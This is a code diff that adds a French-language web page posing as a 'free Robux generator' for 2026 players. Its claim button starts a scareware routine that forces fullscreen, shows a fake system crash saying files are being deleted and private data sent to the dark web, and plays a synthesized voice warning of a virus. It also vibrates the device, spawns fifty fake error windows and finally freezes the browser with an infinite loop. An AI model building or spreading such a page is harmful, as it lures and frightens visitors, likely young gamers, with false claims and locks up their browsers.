@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FREE ROBUX GENERATOR 2026</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: 'Courier New', sans-serif; text-align: center; margin: 0; overflow: hidden; }
+        .btn-claim { background: #2ecc71; color: white; border: none; padding: 20px 40px; font-size: 1.5em; cursor: pointer; margin-top: 20%; border-radius: 50px; box-shadow: 0 0 20px #2ecc71; }
+        #crash-screen { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #0000aa; color: white; padding: 50px; text-align: left; font-family: sans-serif; z-index: 9999; }
+        .glitch { animation: shake 0.1s infinite; color: red; }
+        @keyframes shake { 0% { transform: translate(3px, 3px); } 50% { transform: translate(-3px, -3px); } 100% { transform: translate(0, 0); } }
+    </style>
+</head>
+<body>
+
+    <div id="ui">
+        <h1>💎 10,000 ROBUX GRATUITS 💎</h1>
+        <p>Offre limitée pour les joueurs de 2026</p>
+        <button class="btn-claim" onclick="launchChaos()">RÉCLAMER MAINTENANT</button>
+    </div>
+
+    <div id="crash-screen">
+        <h1>:(</h1>
+        <h2>Votre PC/Mobile a rencontré un problème et doit redémarrer.</h2>
+        <p>Code d'erreur : CRITICAL_PROCESS_DIED_BY_EDIA</p>
+        <p>Suppression de C:/Users/Documents... 45%</p>
+        <p>Envoi des données privées vers le DarkWeb... TERMINE</p>
+        <div id="fake-windows"></div>
+    </div>
+
+    <script>
+        function launchChaos() {
+            // 1. Passage en plein écran
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+
+            // 2. Cacher l'interface et montrer le crash
+            document.getElementById('ui').style.display = 'none';
+            document.getElementById('crash-screen').style.display = 'block';
+            document.body.classList.add('glitch');
+
+            // 3. La Voix Off (Synthèse vocale)
+            let msg = new SpeechSynthesisUtterance("Alerte. Virus détecté. Suppression de tous vos fichiers personnels en cours. Ne tentez pas d'éteindre l'appareil.");
+            msg.lang = 'fr-FR';
+            msg.pitch = 0.1; // Voix de démon
+            msg.rate = 0.8;
+            window.speechSynthesis.speak(msg);
+
+            // 4. Surchauffe (Vibration x Alertes infinies)
+            if (navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 1000, 500]);
+            
+            // 5. Simulation "Ouverture x100"
+            for(let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    let win = document.createElement('div');
+                    win.style.position = 'absolute';
+                    win.style.top = Math.random() * 80 + '%';
+                    win.style.left = Math.random() * 80 + '%';
+                    win.style.width = '300px';
+                    win.style.height = '200px';
+                    win.style.background = '#ccc';
+                    win.style.border = '2px solid black';
+                    win.style.padding = '10px';
+                    win.style.color = 'black';
+                    win.style.zIndex = i;
+                    win.innerHTML = "<b>⚠️ ERROR 0x800" + i + "</b><br>Fichier corrompu détecté !";
+                    document.getElementById('fake-windows').appendChild(win);
+                }, i * 100);
+            }
+
+            // 6. Le cri final et le freeze
+            setTimeout(() => {
+                alert("CRITICAL ERROR: MOTHERBOARD OVERHEATING!");
+                while(true) {} // Freeze le navigateur
+            }, 8000);
+        }
+    </script>
+</body>
+</html>
